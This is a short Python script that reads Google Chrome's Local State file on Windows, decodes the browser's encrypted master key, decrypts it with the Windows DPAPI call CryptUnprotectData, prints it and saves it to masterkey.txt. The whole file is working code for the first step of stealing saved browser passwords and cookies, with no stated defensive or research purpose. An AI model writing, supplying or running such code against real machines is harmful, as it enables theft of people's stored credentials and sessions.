import win32crypt
import os
import json
import base64
with open(os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State',"r") as f:
    local_state = f.read()
    local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key_w_Cry = master_key[5:]
master_key = win32crypt.CryptUnprotectData(master_key_w_Cry, None, None, None, 0)[1]
print(master_key)
with open("masterkey.txt",'wb') as key:
    key.write(master_key)
